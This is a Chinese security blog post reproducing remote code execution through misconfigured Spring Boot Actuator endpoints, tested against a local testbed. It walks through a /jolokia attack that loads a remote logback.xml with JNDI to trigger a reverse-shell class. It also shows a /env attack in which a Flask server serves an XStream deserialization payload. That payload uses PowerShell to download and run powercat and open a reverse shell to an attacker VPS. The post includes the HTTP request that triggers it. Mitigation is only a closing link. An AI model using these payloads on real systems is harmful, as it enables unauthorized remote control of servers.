> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [jianfensec.com](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

日期: [2019-03-12](https://jianfensec.com/archives/2019/03 "20:16:20") 更新: 2020-04-08 分类: [漏洞复现](https://jianfensec.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

漏洞分析源地址：  
[https://www.veracode.com/blog/research/exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

关于 springboot 监控可以参考以下文章：  
[https://www.freebuf.com/news/193509.html](https://www.freebuf.com/news/193509.html)

测试环境，原作者提供的 github：  
[https://github.com/artsploit/actuator-testbed](https://github.com/artsploit/actuator-testbed)

复现过程：

#### [](#1-Remote-Code-Execution-via-‘-jolokia’ "1.Remote Code Execution via ‘/jolokia’")1.Remote Code Execution via ‘/jolokia’

前置条件：  
在 jolokia/list 目录检索存在 logback 组件, 则可以使用 jolokia 远程包含 logback.xml 配置文件，直接执行远程引用字节码：  
[http://127.0.0.1:9090/jolokia/list](http://127.0.0.1:9090/jolokia/list)  
![](https://jianfensec.com/images/2019/03/4140320665.png)

1）在 VPS 上创建 logback.xml，logback 中填写 jndi 服务，当调用时直接触发恶意 class。

```
<configuration>
  <insertFromJNDI env-entry- />
</configuration>
```

![](https://jianfensec.com/images/2019/03/1172285257.png)

2）创建反弹 shell 的恶意 class, 并监听端口 8081  
javac Exploit.java -> Exploit.class  
![](https://jianfensec.com/images/2019/03/3849118789.png)  
3）利用 marshalsec 创建 jndi server 地址指向恶意 class 监听的端口 8081：  
![](https://jianfensec.com/images/2019/03/1439155234.png)  
4）监听反弹 shell 端口：

4）访问 springboot 以下链接触发远程访问 VPS 地址 logback.xml：  
[http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS 地址: 8080!/logback.xml](http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS%E5%9C%B0%E5%9D%80:8080!/logback.xml)  
触发回显 2333 端口接收到主机 whomai 结果：  
![](https://jianfensec.com/images/2019/10/420084106.png)

#### [](#2-Config-modification-via-‘-env’ "2. Config modification via ‘/env’")2. Config modification via ‘/env’

当第一种找不到 logback 配置可以尝试修改 env 配置文件进行 xstream 反序列化  
前置条件：  
Eureka-Client <1.8.7（多见于 Spring Cloud Netflix）  
比如测试前台 json 报错泄露包名就是使用 netflix：  
![](https://jianfensec.com/images/2019/03/1695128671.png)  
需要以下 2 个包

```
spring-boot-starter-actuator（/refresh刷新配置需要）
spring-cloud-starter-netflix-eureka-client（功能依赖）
```

1）在 VPS 创建 xstream 文件，使用 flask 返回 application/xml 格式数据：

```
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value>
      <dataHandler>
        <dataSource>
          <is>
            <cipher>
              <serviceIterator>
                <iter>
                  <iter/>
                  <next>
                    <command>
					<string>powershell</string>
                    <string>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</string>
                      <string>powercat -c [vps地址] -p 2333 -e cmd</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter>
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next>foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')
if __name__ == "__main__":
    app.run(host='172.31.245.127', port=2333)
```

2）启动服务：

```
python3 flask_xstream.py
```

3）写入配置：

```
POST /env HTTP/1.1
Host: 127.0.0.1:9090
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream
```

![](https://jianfensec.com/images/2019/03/134312817.png)

刷新触发 [POST]：  
**一般情况需要等待 3 秒会有响应包，如果立即返回可能是服务缺少 spring-boot-starter-actuator 扩展包无法刷新漏洞则无法利用。**  
![](https://jianfensec.com/images/2019/03/3068556996.png)  
获取反弹 shell：  
![](https://jianfensec.com/images/2019/03/3495674142.png)

### [](#安全措施可参考： "安全措施可参考：")安全措施可参考：

[https://xz.aliyun.com/t/2233](https://xz.aliyun.com/t/2233)

如无特殊说明，均为原创内容。转载请注明出处！